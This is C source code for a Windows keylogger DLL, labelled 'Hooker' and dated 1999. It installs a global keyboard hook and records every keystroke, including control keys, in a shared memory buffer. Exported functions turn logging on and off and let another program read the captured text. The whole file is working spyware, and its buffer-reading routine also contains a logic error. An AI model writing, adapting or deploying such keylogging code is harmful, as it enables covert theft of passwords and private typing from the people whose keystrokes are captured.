/********************************************************************/
/*                                                                  */
/*           Hooker, keylog dynamic link library v2.x               */
/*                         ACrazzi, 1999                            */
/*                                                                  */
/********************************************************************/

#include <stdio.h>
#include <windows.h>

#define BUFFER_SIZE 0x100    //size of buffer for log

//shared data

#pragma comment(linker, "/SECTION:SHARED,RWS")

#pragma data_seg("SHARED")
char buffer[BUFFER_SIZE] = {0};        //log buffer-size
int frame = 0;                         //frame in buffer
int opt = 0;                           //log-options
#pragma data_seg()



HANDLE hInstance;         //handle of dll
HHOOK hHook = NULL;       //hook


BOOL WINAPI DllMain(HANDLE hModule,DWORD,LPVOID)
{
    hInstance = hModule;
    return true;
}

//-----------------CALLBACK function on keyboard hook-----------------
LRESULT CALLBACK KeyboardProc(
        int code,      // hook code
        WPARAM wParam, // virtual-key code 
        LPARAM lParam) // keystroke-message information 
{

//with ignoring of Caps Lock, Num Lock etc
#define FDEFINE_I(keycode,value)\
        {\
        case (keycode):\
        if ((LastCode != CurCode) && (opt)) {\
                strcpy(sz1,(value));\
        };\
        break;\
        }

//without ignoring
#define FDEFINE(keycode,value)\
        {\
        case (keycode):\
        strcpy(sz1,(value));\
        break;\
        }

#define FDEFINE_A(keycode,value)\
        {\
        case (keycode):\
        if (opt) strcpy(sz1,(value));\
        break;\
        }


char sbuf[0x100], sz1[0x100];
int i, CurCode;
static int LastCode = 0;

        
        if ((code == HC_ACTION) && (! (lParam & 0x80000000) )){ 
                CurCode = wParam & 0xFF;
                sz1[0] = 0;
                switch(CurCode) {
                        FDEFINE_I(VK_CONTROL ,"{CTRL}");
                        FDEFINE_I(VK_MENU,"{ALT}");
                        FDEFINE_I(VK_INSERT,"{INS}");
                        FDEFINE_I(VK_CAPITAL,"{Caps Lock}");
                        FDEFINE_I(VK_NUMLOCK,"{Num Lock}");
                        FDEFINE_I(VK_SCROLL,"{Scroll Lock}");
                        FDEFINE_I(VK_SHIFT,"{SHIFT}");
                        FDEFINE_A(VK_ESCAPE,"{ESC}");
                        FDEFINE_A(VK_F1,"{F1}");
                        FDEFINE_A(VK_F2,"{F2}");
                        FDEFINE_A(VK_F3,"{F3}");
                        FDEFINE_A(VK_F4,"{F4}");
                        FDEFINE_A(VK_F5,"{F5}");
                        FDEFINE_A(VK_F6,"{F6}");
                        FDEFINE_A(VK_F7,"{F7}");
                        FDEFINE_A(VK_F8,"{F8}");
                        FDEFINE_A(VK_F9,"{F9}");
                        FDEFINE_A(VK_F10,"{F10}");
                        FDEFINE_A(VK_F11,"{F11}");
                        FDEFINE_A(VK_F12,"{F12}");
                        FDEFINE_A(VK_TAB,"{TAB}");
                        FDEFINE_A(VK_HOME,"{HOME}");
                        FDEFINE_A(VK_END,"{END}");
                        FDEFINE_A(VK_PRIOR,"{PgUp}");
                        FDEFINE_A(VK_NEXT,"{PgDn}");
                        FDEFINE_A(VK_LEFT,"{LEFT}");
                        FDEFINE_A(VK_RIGHT,"{RIGHT}");
                        FDEFINE_A(VK_UP,"{UP}");
                        FDEFINE_A(VK_DOWN,"{DOWN}");
                        FDEFINE_A(VK_CLEAR,"{CLEAR}");
                        FDEFINE_A(VK_SNAPSHOT,"{Print Screen}");
                        FDEFINE_A(VK_PAUSE,"{PAUSE}");
                        
                        FDEFINE(VK_BACK,"{BS}");
                        FDEFINE(VK_RETURN,"\n");
                        FDEFINE(VK_DELETE,"{DEL}");
                        default:
                        GetKeyboardState((PBYTE)sbuf);
                        i = ToAscii(
                                wParam,           // virtual-key code 
                                lParam,           // scan code  
                                (PBYTE) sbuf,     // address of key-state array 
                                (LPWORD) sz1,     // buffer for translated key
                                0                 // active-menu flag 
                        );
                        if ((i == 1) && ((BYTE)sz1[0] < 0x20)) i = 0;
                        sz1[i] = 0;
                        break;
                };
                LastCode = CurCode;
                if (strlen(sz1)) {
                        if ((frame + strlen(sz1)) < BUFFER_SIZE) {
                                memcpy(buffer + frame,sz1,strlen(sz1));
                                frame += strlen(sz1);
                        };
                };
        };
        
        if (code < 0) return CallNextHookEx(hHook,code,wParam,lParam);
        return 0;
};
//---------------------set options------------------------------------
__declspec(dllexport) void KeylogOpt(int id)
{
        opt = id;
};
//--------------------read data from buffer---------------------------
__declspec(dllexport) int GetData(char* d,int size)
{
int retv = 0;
        if (frame) {
                if (frame > size) {
                        memcpy(d,buffer,size);
                        memmove(buffer,buffer + frame,frame - size);
                        retv = size;
                } else {
                        memcpy(d,buffer,frame);
                        retv = frame;
                        frame = 0;
                };
        };
        return retv;
};
//-------------------turn keylog off----------------------------------
__declspec(dllexport) bool KeylogOff(void)
{       
        if (hHook)
                if (UnhookWindowsHookEx(hHook)) hHook = NULL;
        frame = 0;
        return (!hHook);
};
//-------------------turn keylog on-----------------------------------
__declspec(dllexport) bool KeylogOn(void)
{
        if (hHook) KeylogOff();
        frame = 0;
        hHook = SetWindowsHookEx(
                WH_KEYBOARD,            // type of hook to install 
                (HOOKPROC)KeyboardProc, // address of hook procedure 
                hInstance,       // handle of application instance 
                0                // identity of thread to install hook for
        );
#ifdef _DEBUG
        if (!hHook) MessageBox(NULL,"Cannot set Keylog hook","Error",MB_OK);
#endif  
        return (hHook != NULL);
};
